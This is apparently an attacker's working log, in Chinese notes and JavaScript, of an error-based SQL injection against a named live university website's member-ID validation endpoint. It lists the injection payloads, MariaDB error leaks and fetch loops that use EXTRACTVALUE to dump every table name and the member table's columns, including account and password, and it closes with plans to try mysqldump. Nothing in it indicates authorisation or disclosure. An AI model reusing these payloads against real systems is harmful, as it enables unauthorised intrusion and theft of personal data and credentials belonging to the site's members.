1. `?fieldValue=%27`

```
You have an error in your SQL syntax; check the manual that corresponds to your MariaDB server version for the right syntax to use near ''''' at line 1
[null,false]
```

2. `fieldValue=%27%20OR%20%271%27%20=%20%271`

```
[null,false]
```

3. `fieldValue=%27%20AND%20updatexml(null,concat(0x7e,version(),0x7e),null)%20AND%20%271%27%20=%20%271`

```
XPATH syntax error: '~10.1.31-MariaDB~'
[null,false]
```

好快，三次就成功用 Error-Based SQLi 提取到資料

4. 提取 table_name

```js
const result = [];
const config = {
  fixedURL:
    "https://w2.dce.tku.edu.tw/plugins/validationEngine/check_member_id.php",
};
for (let i = 0; i < 65; i++) {
  const sp = new URLSearchParams();
  sp.append(
    "fieldValue",
    `' AND EXTRACTVALUE(1,CONCAT(0x7e,(SELECT table_name FROM information_schema.tables WHERE table_schema='danjian_www' LIMIT ${i},1),0x7e)) AND '1'='1`,
  );
  fetch(`${config.fixedURL}?${sp.toString()}`, {
    credentials: "omit",
  })
    .then((r) => r.text())
    .then((text) => {
      const item = text.split(`XPATH syntax error: '~`)[1].split(`~'`)[0];
      result.push(item);
    });
}
```

```js
[
  "healthinsurance20151126",
  "fn_log",
  "healthinsurance",
  "grouplist",
  "laborinsurance",
  "laborinsurance20151126",
  "mail_content",
  "mail",
  "language",
  "mail_20151209",
  "member",
  "message",
  "officallist",
  "order_content20160127",
  "meta",
  "news",
  "order_content",
  "order_detail",
  "order_list",
  "order_detail20160817",
  "discount_list",
  "order_list20160817",
  "download",
  "editor",
  "fbt_currency",
  "fbt_notify",
  "employee",
  "fbt_order",
  "class",
  "contact",
  "pay_mode",
  "course_member",
  "order_mail",
  "contact_view",
  "dis_single",
  "payroll",
  "admin",
  "ad_news",
  "cellmain",
  "cellsub",
  "priority_admin",
  "check_order",
  "prod_cate",
  "chinesearea",
  "fjpx_db",
  "prod_index",
  "ad",
  "prod_qa",
  "prod_list",
  "rate",
  "receiptset",
  "prod_subcate",
  "stores",
  "sub_group",
  "sys_area_data",
  "sys_city_data",
  "sys_prog",
  "sys_menu",
  "translation",
  "translation20170217",
  "translation20170220",
  "translation20170511",
  "wish_list",
  "translation20170209",
  "sys_config",
];
```

5. 提取 member table 的 column_name

```js
const result = [];
const config = {
  fixedURL:
    "https://w2.dce.tku.edu.tw/plugins/validationEngine/check_member_id.php",
};
for (let i = 0; i < 42; i++) {
  const sp = new URLSearchParams();
  sp.append(
    "fieldValue",
    `' AND EXTRACTVALUE(1,CONCAT(0x7e,(SELECT column_name FROM information_schema.columns WHERE table_schema=database() AND table_name='member' LIMIT ${i},1),0x7e)) AND '1'='1`,
  );
  fetch(`${config.fixedURL}?${sp.toString()}`, {
    credentials: "omit",
  })
    .then((r) => r.text())
    .then((text) => {
      const item = text.split(`XPATH syntax error: '~`)[1].split(`~'`)[0];
      result.push(item);
    });
}
```

```js
[
  "name_en",
  "comp_title",
  "stdNum",
  "sn",
  "como_job_title",
  "country",
  "grad_time",
  "join_time",
  "source_in",
  "self_file",
  "upd_time",
  "source_ip",
  "totkupsc",
  "region",
  "area",
  "address",
  "address_now",
  "pager",
  "active",
  "alumni",
  "tel2",
  "zipCode",
  "invoice_cid",
  "school",
  "s_school",
  "q_teacher_id_nu",
  "hire_stdate",
  "q_teacher_id_date",
  "personal",
  "hire_endate",
  "gender",
  "email",
  "country_name",
  "birthday",
  "tel1",
  "marriage",
  "companyName",
  "city",
  "id",
  "account",
  "password",
  "name",
];
```

mysqldump，root 使用者只能透過 localhost 連線，python 那個可以再試試看
